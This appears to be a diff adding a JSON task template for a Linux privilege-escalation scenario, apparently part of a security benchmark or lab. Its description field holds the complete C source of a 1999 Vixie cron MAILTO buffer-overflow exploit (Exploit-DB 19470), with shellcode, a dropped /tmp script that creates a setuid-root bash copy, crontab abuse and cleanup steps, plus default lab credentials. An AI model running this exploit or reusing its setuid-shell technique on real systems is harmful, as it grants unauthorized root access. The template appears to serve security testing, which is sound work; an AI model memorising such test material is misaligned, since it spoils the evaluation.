@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_19470",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: RedHat Linux 4.2/5.2/6.0 / S.u.S.E Linux 6.0/6.1 - Cron Buffer Overflow (2) (CVE-1999-0768;OSVDB-1058)\n\nExploit source code (19470.c):\n```\n// source: https://www.securityfocus.com/bid/602/info\n\nThe version of Vixie cron that ships with RedHat versions 4.2, 5.2 and 6.0 is vulnerable to a local buffer overflow attack. By utilizing the MAILTO environment variable, a buffer can be overflown in the cron_popen() function, allowing an attacker to execute arbitrary code. Vixie cron daemon is installed setuid root by default, allowing for a local root compromise. Recent versions of Debian GNU/Linux have been confirmed to not be vulnerable to this attack.\n\n/*\n * VixieCron 3.0 Proof of Concept Exploit - w00w00\n *\n * Not only does Paul give up root with this one, but with his creative use of\n * strtok() he actually ends up putting the address of our shellcode in eip.\n *\n * Many Thanks: Cheez Wiz, Sangfroid\n * Thanks: stran9er, Shok\n * Props: attrition.org,mea_culpa,awr,minus,Int29,napster,el8.org,w00w00\n * Drops: Vixie, happyhacker.org, antionline.com, <insert your favorite web \\\n *        defacement group here>\n *\n * Hellos: pm,cy,bm,ceh,jm,pf,bh,wjg,spike.\n *\n * -jbowie@el8.org\n *\n */\n\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <pwd.h>\n\nchar shellcode[] =\n        \"\\xeb\\x40\\x5e\\x89\\x76\\x0c\\x31\\xc0\\x89\\x46\\x0b\\x89\\xf3\\xeb\"\n        \"\\x27w00w00:Ifwewerehackerswedownyourdumbass\\x8d\\x4e\"\n        \"\\x0c\\x31\\xd2\\x89\\x56\\x16\\xb0\\x0b\\xcd\\x80\\xe8\\xbb\\xff\\xff\"\n        \"\\xff/tmp/w00w00\";\n\nint\nmain(int argc,char *argv[])\n\n        FILE *cfile,*tmpfile;\n        struct stat sbuf;\n        struct passwd *pw;\n        int x;\n\n        pw = getpwuid(getuid());\n\n        chdir(pw->pw_dir);\n        cfile = fopen(\"./cronny\",\"a+\");\n        tmpfile = fopen(\"/tmp/w00w00\",\"a+\");\n\n        fprintf(cfile,\"MAILTO=\");\n        for(x=0;x<96;x++)\n                fprintf(cfile,\"w00w00 \");\n        fprintf(cfile,\"%s\",shellcode);\n        fprintf(cfile,\"\\n* * * * * date\\n\");\n        fflush(cfile);\n\n        fprintf(tmpfile,\"#!/bin/sh\\ncp /bin/bash %s\\nchmod 4755 %s/bash\\n\", pw->pw_dir,pw->pw_dir);\n        fflush(tmpfile);\n\n        fclose(cfile),fclose(tmpfile);\n\n        chmod(\"/tmp/w00w00\",S_IXUSR|S_IXGRP|S_IXOTH);\n\n        if(!(fork())) {\n                execl(\"/usr/bin/crontab\",\"crontab\",\"./cronny\",(char *)0);\n        } else {\n                printf(\"Waiting for shell be patient....\\n\");\n                for(;;) {\n                        if(!(stat(\"./bash\",&sbuf))) {\n                                        break;\n                        } else { sleep(5); }\n                }\n                if((fork())) {\n                        printf(\"Thank you for using w00warez!\\n\");\n                        execl(\"./bash\",\"bash\",(char *)0);\n                } else {\n                        remove(\"/tmp/w00w00\");\n                        sleep(5);\n                        remove(\"./bash\");\n                        remove(\"./cronny\");\n                        execl(\"/usr/bin/crontab\",\"crontab\",\"-r\",(char *)0);\n                }\n        }\n}\n```",
+  "cve": "CVE-1999-0768;OSVDB-1058",
+  "exploitdb_id": "19470",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_19470",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
